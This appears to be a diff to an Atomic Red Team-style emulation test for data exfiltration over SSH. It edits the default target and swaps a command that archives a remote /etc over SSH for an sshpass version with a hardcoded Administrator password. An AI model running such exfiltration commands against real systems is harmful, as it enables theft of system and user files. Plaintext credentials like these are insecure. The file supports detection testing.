@@ -16,10 +16,10 @@ atomic_tests:
     domain:
       description: target SSH domain
       type: Url
-      default: target.example.com
+      default: 192.168.1.100
   executor:
     command: |
-      ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
+      sshpass -p Password123! ssh Administrator@#{domain} "(cd /Temp && tar -zcvf - *)" > ./etc.tar.gz
     name: sh
 - name: Exfiltration Over Alternative Protocol - SSH
   auto_generated_guid: 7c3cb337-35ae-4d06-bf03-3032ed2ec268
